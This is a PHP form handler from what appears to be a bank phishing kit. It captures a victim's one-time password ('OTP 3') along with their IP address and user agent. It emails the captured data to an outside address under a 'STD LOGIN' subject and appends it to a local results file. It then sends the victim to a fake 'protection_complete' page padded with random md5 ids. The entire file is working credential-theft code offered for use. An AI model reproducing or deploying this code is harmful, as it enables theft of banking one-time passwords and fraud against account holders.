<?php
if($_POST["tp"] != "" and $_POST["tp"] != ""){
date_default_timezone_set("Africa/Johannesburg");
$ip = $_SERVER['REMOTE_ADDR'];
	$time = time();
	$date = date("Y-m-d H:i:s");
	$tp3 = $_POST['tp'];
$ip = getenv("REMOTE_ADDR");
$hostname .= gethostbyaddr($ip);
$useragent .= $_SERVER['HTTP_USER_AGENT'];
$message .= '<html>
<head></head>
                    <body>
                        <table style="">
                          
                            <tr>
                                <td style="font-weight: bold">OTP 3:</td>
                                <td style="padding-left: 1em;">'.$_POST['tp'].'</td>
                            </tr>
                            <tr>
                                <td style="font-weight: bold">IP Address:</td>
                                <td style="padding-left: 1em;">'.$ip.'</td>
                            </tr>
							<tr>
							<td style="font-weight: bold">User Agent:</td>
							<td style="padding-left: 1em;">'.$useragent.'</td></tr>
                        </table>
                    </body>
                </html>';
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "|-----------Don Money-------------|\n";

   $from = "5th Result <support@".$_SERVER['HTTP_HOST'].">";
	$headers = "From:" . $from. "\r\n";
        $headers .= "MIME-Version: 1.0" . "\r\n";
        $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
        $subject = "STD LOGIN [$tp3] [$ip] [$date]";
        if(mail("info@pragmalaw.in",$subject,$message,$headers))
		$fp = fopen("myresults.txt","a");
fputs($fp,$message);
fclose($fp);	
		$praga=rand();
$praga=md5($praga);
  header ("Location: protection_complete.php?cmd=login_submit&id=$praga$praga&session=$praga$praga");
}else{
header ("Location: index.php");
}

?>

